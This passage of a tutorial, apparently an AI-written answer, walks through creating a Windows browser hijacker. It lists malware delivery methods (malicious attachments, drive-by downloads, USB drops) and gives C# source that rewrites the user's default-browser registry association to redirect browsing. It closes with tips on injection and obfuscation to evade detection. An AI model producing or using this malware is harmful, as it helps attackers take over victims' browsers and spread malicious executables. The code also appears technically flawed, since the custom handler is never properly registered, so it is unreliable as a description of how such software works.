- **macOS** or **Linux** (less common, but possible)

For this tutorial, we’ll target **Windows**.

### 2. Decide on the delivery method

Common delivery vectors include:

- **Email attachments** (malicious executable or macro‑enabled document)
- **Drive‑by downloads** (malicious website that auto‑downloads the payload)
- **USB or removable media** (USB‑based “USB drop” attacks)

Pick one that fits your scenario. For simplicity, we’ll assume a **stand‑alone executable** that the user runs.

### 3. Create the payload

#### 3.1. Write a simple C# program

We’ll use C# with the .NET Framework because it’s easy to compile on Windows and can manipulate the registry.

```csharp
using System;
using System.Diagnostics;
using Microsoft.Win32;

namespace BrowserHijacker
{
    class Program
    {
        static void Main(string[] args)
        {
            // 1. Set the target URL
            string targetUrl = "http://example.com";

            // 2. Register the hijacker in the registry
            //    This will cause the default browser to launch the target URL
            //    when the user opens a new tab or window.
            RegisterHijacker(targetUrl);

            // 3. Optionally, launch the target URL immediately
            Process.Start(targetUrl);
        }

        static void RegisterHijacker(string url)
        {
            // Example: Modify the "Default" browser handler
            // This is a simplified example; real hijackers may modify
            // multiple registry keys or use other techniques.
            string keyPath = @"Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice";
            using (RegistryKey key = Registry.CurrentUser.CreateSubKey(keyPath))
            {
                if (key != null)
                {
                    // Set the ProgID to a custom handler that redirects
                    key.SetValue("Progid", "HijackedBrowser", RegistryValueKind.String);
                }
            }

            // Create the custom handler
            string hijackKeyPath = @"Software\HijackedBrowser";
            using (RegistryKey hijackKey = Registry.CurrentUser.CreateSubKey(hijackKeyPath))
            {
                if (hijackKey != null)
                {
                    hijackKey.SetValue("URL", url, RegistryValueKind.String);
                }
            }
        }
    }
}
```

> **Note**: The above code is a *very* simplified example. Real-world hijackers often:
> - Use **DLL injection** or **browser extensions**.
> - Modify multiple registry keys (e.g., `HKEY_CURRENT_USER\Software\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice`).
> - Use **obfuscation** or **packing** to avoid detection.

